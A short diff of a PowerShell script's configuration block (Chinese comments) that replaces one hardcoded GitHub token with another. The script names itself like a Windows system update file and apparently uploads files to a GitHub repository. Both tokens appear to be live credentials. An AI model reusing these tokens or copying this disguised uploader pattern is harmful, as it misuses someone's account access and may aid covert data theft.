@@ -1,7 +1,7 @@
 # === 基本设置 ===
 $localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
 $logPath = "C:\ProgramData\upload_log.txt"
-$token = "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"  # ✅ 替换为你自己的 GitHub Token
+$token = "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"  # ✅ 替换为你自己的 GitHub Token
 $repo = "drftghy/backup-files"
 
 # 输出编码设置
